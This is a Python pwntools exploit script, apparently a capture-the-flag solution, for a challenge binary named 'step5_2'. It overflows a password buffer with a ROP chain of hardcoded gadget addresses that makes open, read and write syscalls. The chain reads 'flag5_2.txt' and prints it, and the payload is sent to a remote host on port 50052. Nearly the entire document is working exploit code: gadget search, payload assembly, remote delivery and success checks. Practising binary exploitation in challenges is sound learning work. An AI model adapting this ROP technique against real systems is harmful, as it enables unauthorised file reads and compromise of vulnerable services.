from binascii import unhexlify
from pwn import *
import traceback

def resetString(str):
    result = ""
    #print str
    for char in str:
        result += "0"

    return result

def reverseBytewiseHex(str):
    reversed_str = ""
    for index in range(0, len(str)/2):
        offset = 14 - index * 2
        reversed_str += str[offset:(offset + 2)]
    return reversed_str

def incReversedHexString(str, length):
    hexNum=hex(int(reverseBytewiseHex(str), base=16)+1)[2:]
    hexNum = "0"*(length-len(hexNum)) + hexNum
    return reverseBytewiseHex(hexNum)


def checkErrors(str):
    if ('flag{' in str) or ('flag5' in str):
        print "Exploit works, Flag found!!"
        print str
        sys.exit(0)
    if ('OOPS' in str):
        return 0
    if ('Checkpoint' in str):
        #print "-------------------------------------------------------------------"
        #print str
        str = str[str.find('Checkpoint')+10:]
        #print str
        if ('Checkpoint' in str):
            #print "--->yeahh"
            return 1
    return 2


def exploit(length_password_ebp):

    rop = ROP(ELF('./bin/step5_2'))
    #rop = ROP(ELF('/lib/x86_64-linux-gnu/libc-2.24.so'))






    print rop.find_gadget(['pop rbp', 'ret'])
    print rop.find_gadget(['pop rdi', 'ret'])
    print rop.find_gadget(['pop rsi', 'ret'])
    print rop.find_gadget(['pop rdx', 'ret'])
    print rop.find_gadget(['pop rbx', 'ret'])
    print rop.find_gadget(['pop rcx', 'ret'])
    print rop.find_gadget(['syscall', 'ret'])






    saved_ebp   = "f0e1ffffff7f0000"

    # missing gadget for exploit: mov rdi, rax  <- ?
    #                             sub sp, 0xfff <- solveable by using absolute adress

    jumps_and_values = [# oeffnen der flag datei
                        0x00000000004811e6, 0x0000000000000002,     # 2 in rax
                        0x0000000000000000,  # 0 in rdx
                        0x0000000000000000,  # 0 in rbx
                        0x0000000000401b85, 0x00007fffffffeba0,     # pop rdi -> adresse im stack (zeigt auf string "flag5_2.txt")
                        0x0000000000401cb7, 0x0000000000000000,     # pop rsi ->  O_RDONLY (flags)
                        0x0000000000443b46, 0x0000000000000000,     # pop rdx ->  0(mode)
                        0x000000000043fd35,                         # syscall

                        # read file content
                        0x0000000000401cb7, 0x00007fffffffeba0,     # pop rsi
                        0x0000000000401b85, 0x0000000000000004,     # set rdi 4
                        0x0000000000443b46, 0x0000000000000032,     # set rdx to 0x32 -> read 50 letters
                        0x00000000004406f0,                         # set eax 0 + syscall

                        # check rsi not overwritten
                        # print file content
                        0x0000000000401cb7, 0x00007fffffffeba0,     # pop rsi
                        0x0000000000401b85, 0x0000000000000001,     # set rdi to 1
                        0x0000000000443b46, 0x0000000000000032,     # set rdx to 0x32 (letters to write)
                        0x0000000000440750,                         # set eax 1 + syscall


                        # exit
                        # 0x00000000004811e6, 0x0000000000000060,     # 60 in rax
                        # 0x0000000000000000,  # 0 in rdx
                        # 0x0000000000000000,  # 0 in rbx
                        # 0x000000000043fd35,  # syscall

                        #0x0000000000440690,                         # sysopen check error sigtraptrap
                    ]



    filename = "flag5_2.txt\0"
    input = filename + (length_password_ebp-len(filename))*'B'

    #print [struct.pack("<Q", x) for x in jumps_and_values]

    input += unhexlify(saved_ebp) + ''.join([struct.pack("<Q", x) for x in jumps_and_values]) + "flag5_2.txt" + "\n"
    print "address postition offset: " + hex(0x7fffffffe0c0 + len(input)-len("flag5_2.txt" + "\n"))
    print "len input without flag: " + str(len(input)-len("flag5_2.txt" + "\n"))
    #print input

    #p = process('./bin/step5_2')
    p = remote( "dumbistan.life", 50052)

    p.sendline('1')

    totalCommunication = ""
    index = 0
    while True:
        try:
            if (index == 0):
                p.sendline("username") # would be overwritten anyway
            elif (index == 1):
                p.sendline(input)

            recv = p.recv()
            #print recv

            totalCommunication += recv
            #print totalCommunication
            errCode = checkErrors(totalCommunication)
            if (errCode == 0):
                print "False-> close"
                p.close()
                print totalCommunication
                return False
            elif (errCode == 1):
                print "True-> close"
                #print input[-1]
                #print int(input[-1], base=16)
                #print totalCommunication
                p.close()
                return True
        except EOFError:
            print totalCommunication
            traceback.print_exc(file=sys.stdout)

            print "----> Connection closed" + str(index)
            #sys.exit(0)
            break

        index += 1


exploit(128)